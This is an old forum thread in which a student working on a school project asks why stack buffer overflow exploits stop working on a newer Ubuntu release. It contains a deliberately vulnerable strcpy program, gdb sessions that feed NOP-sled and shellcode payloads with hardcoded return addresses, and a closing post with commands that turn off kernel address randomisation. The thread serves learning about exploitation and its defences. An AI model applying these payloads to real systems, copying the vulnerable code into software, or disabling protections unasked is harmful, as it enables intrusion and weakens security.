---
title: "Stack protection?"
date: 2005-12-03
forum: General Help
---

### Post by Devinci on 2005-12-03
Hi, I'm experimenting with overflows for a school project. It was going well using ubuntu warty. But the same vulnerable codes appears not to be exploitable using same techniques in ubuntu breezy.

Linux ubuntu 2.6.12-10-386
It uses gcc-4.0.2 by default
I installed gcc 3.3 and 3.4 to compile my vulnerable programs, but it still doesnt work.

ex:

I use this function to get a return address, actually getting the esp :
```

 __asm__("movl %esp, %eax")

```

It gives me : 1) 0xbfd49f18, but everytime i run it, it gives me a different address?
2) 0xbfabd508 3) 0xbfacd9f8 4) 0xbfb90518 and so on...

How can i find a valid return address in this context?

For example let's take this vulnerable code :

```

int main(int argc, char *argv[]) {
   char buffer[500];
   strcpy(buffer, argv[1]);
   return 0;
}

```

How can I know for sure the address of my buffer?

Because i can overwrite ret address as shown :

```

$ ./esp
Stack pointer (ESP) : 0xbfb23f38
$ gdb vuln
GNU gdb 6.3-debian
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) r `perl -e 'print "\x90"x478;'``cat shellcode``perl -e 'print "\x38\x3f\xb2\xbf";'`
Starting program: vuln `perl -e 'print "\x90"x478;'``cat shellcode``perl -e 'print "\x38\x3f\xb2\xbf";'`

Program received signal SIGSEGV, Segmentation fault.
0xbfb23f38 in ?? ()
(gdb)

```

But apparently, it dosent matter what ret address I use, I cannot exploit it.

ex"

```

$ export SHELLCODE=`perl -e 'print "\x90"x100;'``cat shellcode`
$ ./getenv SHELLCODE
SHELLCODE is located at 0xbfa019c5
$ gdb vuln
GNU gdb 6.3-debian
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) r `perl -e 'print "\x90"x524 . "\xc5\x19\xa0\xbf";'`
Starting program: vuln `perl -e 'print "\x90"x524 . "\xc5\x19\xa0\xbf";'`

Program received signal SIGSEGV, Segmentation fault.
0xbfa019c5 in ?? ()
(gdb)

```

I thought it was saving the ret address somewhere else and then comparing it to the actual ret addr, but I dont get any clue that this is being done :

```

(gdb) disassemble main
Dump of assembler code for function main:
0x08048384 <main+0>:    push   %ebp
0x08048385 <main+1>:    mov    %esp,%ebp
0x08048387 <main+3>:    sub    $0x218,%esp
0x0804838d <main+9>:    and    $0xfffffff0,%esp
0x08048390 <main+12>:   mov    $0x0,%eax
0x08048395 <main+17>:   sub    %eax,%esp
0x08048397 <main+19>:   mov    0xc(%ebp),%eax
0x0804839a <main+22>:   add    $0x4,%eax
0x0804839d <main+25>:   mov    (%eax),%eax
0x0804839f <main+27>:   mov    %eax,0x4(%esp)
0x080483a3 <main+31>:   lea    0xfffffdf8(%ebp),%eax
0x080483a9 <main+37>:   mov    %eax,(%esp)
0x080483ac <main+40>:   call   0x80482b0 <_init+56>
0x080483b1 <main+45>:   mov    $0x0,%eax
0x080483b6 <main+50>:   leave
0x080483b7 <main+51>:   ret
End of assembler dump.
(gdb)

```


Is there a way to disable some sort of stack protection thats going on so I can continue with my assignment? I dont want to install back warty just for that.

---

### Post by Devinci on 2005-12-03
Someone told me it was some randomisation implemented by default.

To turn it off:

```

sudo bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
sudo /sbin/sysctl -p 

```

---

